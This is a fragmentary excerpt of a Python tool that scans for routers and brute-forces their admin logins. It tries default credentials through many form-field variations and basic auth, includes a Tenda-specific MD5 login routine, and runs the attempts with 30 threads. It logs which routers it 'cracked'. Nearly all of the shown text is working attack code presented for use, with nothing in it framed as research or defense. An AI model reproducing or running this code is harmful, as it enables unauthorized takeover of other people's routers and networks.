...
╚══════════════════════════════════════════════════════════════╝
    ...
    def try_all_passwords(self, router):
        ...
        if router.get('vulnerability_score'):
        ...
        for username, password in TEST_CREDENTIALS:
            ...
            if login_action:
                try:
                    ...
                    if data:
                        response = self.session.post(login_action, data=data, timeout=1, 
            ...
            form_variations = [
                ...
                # Password-only fields (Tenda, etc.)
                {'password': password},
                {'pass': password},
                {'pwd': password},
                {'passwd': password},
            ...
            for path in LOGIN_PATHS:
                ...
                for data in form_variations:
                    try:
                        response = self.session.post(url, data=data, timeout=0.5, 
                                                     allow_redirects=True)
                        if self.is_logged_in(response, username, password):
                            print("✅ SUCCESS!")
                            return {
            ...
            for path in LOGIN_PATHS[:3]:
                try:
                    ...
                    response = self.session.get(url, auth=(username, password), 
                                                timeout=0.5, allow_redirects=True)
                    if self.is_logged_in(response, username, password):
                        print("✅ SUCCESS!")
                        return {
                            'username': username,
            ...
            # === METHOD 5: Tenda/GoAhead MD5 login ===
            if router['brand'] == 'tenda':
                try:
                    stok = self.session.get(f"{base_url}/goform/getstok", timeout=1)
                    random_key = stok.json().get('random', '')
                    if random_key:
                        encoded_pwd = base64.b64encode(password.encode('utf-8')).decode('ascii')
                        hash_input = encoded_pwd + random_key
                        hashed = hashlib.md5(hash_input.encode('utf-8')).hexdigest()
                        response = self.session.post(f"{base_url}/login/Auth",
                                                     data={"password": hashed},
                                                     timeout=1, allow_redirects=False)
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '').lower()
                            if 'index' in location or 'admin' in location or 'home' in location:
                                print("✅ SUCCESS!")
                                return {
                                    'username': username,
                                    'password': password,
    ...
    def detect_login_form(self, html_content, base_url):
        ...
        action_match = re.search(form_pattern, html_content, re.IGNORECASE | re.DOTALL)
        ...
        for inp in inputs:
            if inp.lower() not in ['submit', 'button', 'reset', 'image']:
                fields.append(inp)
    ...
    def is_logged_in(self, response, username, password):
        # Followed redirect to non-login URL = success (e.g. 302 -> dashboard)
        if response.history:
        ...
        if response.status_code == 200:
            ...
            failure_patterns = [
                ...
                'wrong password', 'incorrect username'
            ]
            ...
            if response.cookies:
                for cookie in response.cookies:
                    ...
                    if 'session' in cookie_name or 'auth' in cookie_name or 'sid' in cookie_name:
                        return True

            # Check for success indicators (post-login page)
            success_patterns = [
                'logout', 'dashboard', 'configuration',
                'wireless', 'firewall', 'wan', 'lan', 'connected',
                'overview', 'system', 'welcome', 'settings'
            ]
    ...
    def process_routers(self, routers):
        """Try cracking all found routers"""
        if not routers:
            return [], []
        
        print(f"\n💀 Attempting to crack {len(routers)} routers...")
        print("=" * 60)
        
        cracked = []
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self.try_all_passwords, router): router for router in routers}
        ...
        return routers, cracked
    
    def save_results(self, routers, all_routers, cracked):
        filename = f"router_scan_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("🌐 ROUTER SCAN RESULTS - JUMMAN BRO \n")
                f.write("=" * 60 + "\n")
                ...
                uncracked = [r for r in all_routers if r['ip'] not in [c['ip'] for c in cracked]]
                if uncracked:
                    f.write("\n🔓 UNCRACKED ROUTERS:\n")
                    f.write("-" * 40 + "\n")
                    for i, r in enumerate(uncracked, 1):
    ...
    def run(self):
        ...
        if choice == '1':
            ...
            if routers:
                ...
                if save == 'y':
                    self.save_results(routers, routers, cracked)
            else:
                print("\n❌ No routers found!")
            ...
            if all_routers:
                ...
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(all_routers, all_routers, cracked)
            else:
                print("\n❌ No routers found!")
